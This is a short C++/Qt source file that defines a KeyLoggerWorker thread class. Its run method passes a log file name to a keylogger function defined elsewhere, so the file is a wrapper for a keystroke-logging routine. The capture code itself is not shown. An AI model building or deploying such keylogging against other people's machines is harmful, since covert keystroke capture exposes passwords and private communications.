#include <keyloggerworker.h>
#include <keylogger.h>

KeyLoggerWorker::KeyLoggerWorker(QString fileName)
{
  m_fileName = fileName;
}

void KeyLoggerWorker::run()
{
  keylogger(m_fileName.toLocal8Bit());
}
